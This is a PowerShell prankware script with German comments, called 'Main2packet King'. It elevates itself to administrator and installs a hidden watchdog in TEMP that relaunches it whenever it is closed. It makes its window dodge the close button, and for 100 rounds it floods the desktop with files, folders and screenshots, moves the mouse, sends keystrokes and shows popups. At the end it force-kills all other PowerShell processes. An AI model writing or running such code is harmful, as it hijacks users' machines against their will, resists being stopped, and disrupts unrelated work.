# Administrator-Rechte anfordern
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process PowerShell -Verb RunAs -ArgumentList "-File `"$PSCommandPath`""
    exit
}

# ===== ERROR HANDLING =====
$ErrorActionPreference = "SilentlyContinue"
$Host.UI.RawUI.WindowTitle = "Main2packet System"

# ===== WINDOW SCHUTZ - FENSTER SPRINGT WEG! =====
Add-Type -Name Window -Namespace Console -MemberDefinition @'
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("User32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
[DllImport("User32.dll")]
public static extern bool SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
[DllImport("user32.dll")]
public static extern bool GetCursorPos(ref System.Drawing.Point lpPoint);
[DllImport("user32.dll")]
public static extern int GetSystemMetrics(int nIndex);
[DllImport("user32.dll")]
public static extern short GetAsyncKeyState(int vKey);
'@

# Konstanten
$HWND_TOPMOST = -1
$SWP_NOSIZE = 0x0001
$SWP_SHOWWINDOW = 0x0040
$SM_XVIRTUALSCREEN = 76
$SM_YVIRTUALSCREEN = 77
$SM_CXVIRTUALSCREEN = 78
$SM_CYVIRTUALSCREEN = 79

$consoleHandle = [Console.Window]::GetConsoleWindow()
$windowWidth = 800
$windowHeight = 600

# Bildschirmgröße
$screenWidth = [Console.Window]::GetSystemMetrics($SM_CXVIRTUALSCREEN)
$screenHeight = [Console.Window]::GetSystemMetrics($SM_CYVIRTUALSCREEN)

# ===== WATCHDOG - STARTET NEU BEI SCHLIESSEN =====
$watchdogScript = @"
while(`$true) {
    `$powershell = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.MainWindowTitle -like "*Main2packet*"}
    if (`$powershell.Count -eq 0) {
        Start-Process powershell -WindowStyle Normal -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    }
    Start-Sleep -Seconds 2
}
"@
$watchdogScript | Out-File "$env:TEMP\watchdog_main2packet.ps1" -Encoding UTF8 -Force
Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\watchdog_main2packet.ps1`""

# ===== FENSTER ÜBERWACHUNG =====
$monitorJob = Start-Job -ScriptBlock {
    while ($true) {
        # Fenster finden
        $window = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {$_.MainWindowTitle -like "*Main2packet*"} | Select-Object -First 1
        
        if ($window) {
            $hwnd = $window.MainWindowHandle
            
            # Mausposition
            $cursorPos = New-Object System.Drawing.Point
            [Console.Window]::GetCursorPos([ref]$cursorPos)
            
            # Fensterposition
            $windowRect = $window.MainWindowRect
            $windowX = $windowRect.X
            $windowY = $windowRect.Y
            $windowWidth = $windowRect.Width
            $windowHeight = $windowRect.Height
            
            # X-Button Bereich (rechte obere Ecke)
            $xButtonX = $windowX + $windowWidth - 40
            $xButtonY = $windowY + 10
            $xButtonSize = 30
            
            # Prüfen ob Maus über X
            $mouseOverX = ($cursorPos.X -ge $xButtonX -and 
                          $cursorPos.X -le $xButtonX + $xButtonSize -and
                          $cursorPos.Y -ge $xButtonY -and 
                          $cursorPos.Y -le $xButtonY + $xButtonSize)
            
            # Prüfen ob Maus über oberer Leiste (zum Verschieben)
            $mouseOverTitleBar = ($cursorPos.X -ge $windowX -and 
                                  $cursorPos.X -le $windowX + $windowWidth -and
                                  $cursorPos.Y -ge $windowY -and 
                                  $cursorPos.Y -le $windowY + 30)
            
            # Wenn Maus über X oder Titlebar -> FENSTER SPRINGT WEG!
            if ($mouseOverX -or $mouseOverTitleBar) {
                # Zufällige neue Position
                $newX = Get-Random -Minimum 50 -Maximum ([Console.Window]::GetSystemMetrics(78) - 400)
                $newY = Get-Random -Minimum 50 -Maximum ([Console.Window]::GetSystemMetrics(79) - 300)
                
                # Fenster bewegen!
                [Console.Window]::SetWindowPos($hwnd, -1, $newX, $newY, 0, 0, 0x0001 -bor 0x0040)
                
                # Kurze Pause
                Start-Sleep -Milliseconds 300
            }
            
            # Prüfen ob Fenster geschlossen werden soll (X gedrückt)
            $closeAttempt = [Console.Window]::GetAsyncKeyState(0x1B)  # ESC Taste
            if ($closeAttempt -ne 0) {
                $newX = Get-Random -Minimum 50 -Maximum 1500
                $newY = Get-Random -Minimum 50 -Maximum 800
                [Console.Window]::SetWindowPos($hwnd, -1, $newX, $newY, 0, 0, 0x0001 -bor 0x0040)
            }
        }
        Start-Sleep -Milliseconds 50
    }
}

# ===== KONFIGURATION =====
$global:currentRound = 0
$global:maxRounds = 100
$desktop = [Environment]::GetFolderPath("Desktop")
$documents = [Environment]::GetFolderPath("MyDocuments")
$music = [Environment]::GetFolderPath("MyMusic")
$pictures = [Environment]::GetFolderPath("MyPictures")
$videos = [Environment]::GetFolderPath("MyVideos")

# ===== START =====
Clear-Host
Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Red
Write-Host "║   👑 MAIN2PACKET KING - UNAUFFHALTSAM    👑" -ForegroundColor Red
Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Red
Write-Host ""
Write-Host "📊 Runden: 0/$global:maxRounds" -ForegroundColor Yellow
Write-Host "🎯 Versuch das X zu treffen... VIEL GLÜCK!" -ForegroundColor Cyan
Write-Host "🔄 Watchdog aktiv - Schließen startet NEU!" -ForegroundColor Green
Write-Host ""
Start-Sleep -Seconds 3

# Hauptschleife
while ($global:currentRound -lt $global:maxRounds) {
    $global:currentRound++
    
    Clear-Host
    Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Red
    Write-Host "║   👑 MAIN2PACKET KING - RUNDE $global:currentRound   👑" -ForegroundColor Red
    Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Red
    Write-Host ""
    Write-Host "📊 Fortschritt: $global:currentRound/$global:maxRunden" -ForegroundColor Green
    Write-Host ""
    
    # TROLL 1: Desktop Dateien
    for ($i = 1; $i -le 15; $i++) {
        $filePath = Join-Path $desktop "MAIN2PACKET_KING_$global:currentRound`_$i.king"
        "👑 Main2packet King - Datei $i" | Out-File $filePath -Encoding UTF8
    }
    
    # TROLL 2: Ordner
    for ($i = 1; $i -le 8; $i++) {
        $name = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_})
        New-Item -Path "$desktop\MAIN2PACKET_KING_$name" -ItemType Directory -Force | Out-Null
    }
    
    # TROLL 3: Maus kurz bewegen
    Add-Type -AssemblyName System.Windows.Forms
    for ($i = 1; $i -le 8; $i++) {
        [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point (
            (Get-Random -Min 100 -Max 1500),
            (Get-Random -Min 100 -Max 800)
        )
        Start-Sleep -Milliseconds 50
    }
    
    # TROLL 4: Sound
    Add-Type -AssemblyName System.Media
    $sounds = @("SystemAsterisk", "SystemExclamation", "SystemHand")
    $sound = Get-Random $sounds
    [System.Media.SystemSounds]::$sound.Play()
    
    # TROLL 5: Tasten
    $wsh = New-Object -ComObject WScript.Shell
    $wsh.SendKeys('{CAPSLOCK}')
    Start-Sleep -Milliseconds 50
    $wsh.SendKeys('{NUMLOCK}')
    Start-Sleep -Milliseconds 50
    
    # TROLL 6: Screenshot
    Add-Type -AssemblyName System.Windows.Forms
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
    $bitmap.Save("$desktop\MAIN2PACKET_KING_SS$global:currentRound.png")
    $graphics.Dispose()
    $bitmap.Dispose()
    
    # TROLL 7: Popup
    $popup = New-Object -ComObject Wscript.Shell
    $popup.Popup("👑 RUNDE $global:currentRound`n🎯 SCHAFFST DU DAS X?", 1, "MAIN2PACKET KING", 64)
    
    # TROLL 8: Farbwechsel
    $colors = @("Red", "Green", "Blue", "Yellow", "Cyan", "Magenta")
    $color = Get-Random $colors
    $Host.UI.RawUI.BackgroundColor = $color
    
    # TROLL 9: Kopien
    for ($i = 1; $i -le 5; $i++) {
        $filePath = Join-Path $desktop "MAIN2PACKET_KING_COPY_$global:currentRound`_$i.king"
        "👑 Kopie $i" | Out-File $filePath -Encoding UTF8
    }
    
    # TROLL 10: Auto-Typing
    $wsh.SendKeys('Main2packet King... ')
    
    Write-Host "✅ RUNDE $global:currentRound FERTIG!" -ForegroundColor Yellow
    Write-Host "⏳ Nächste Runde in 2 Sekunden..." -ForegroundColor Cyan
    Start-Sleep -Seconds 2
}

# ===== ENDE =====
Get-Process -Name "powershell" | Where-Object {$_.Id -ne $pid} | Stop-Process -Force
Remove-Item "$env:TEMP\watchdog_main2packet.ps1" -Force
exit
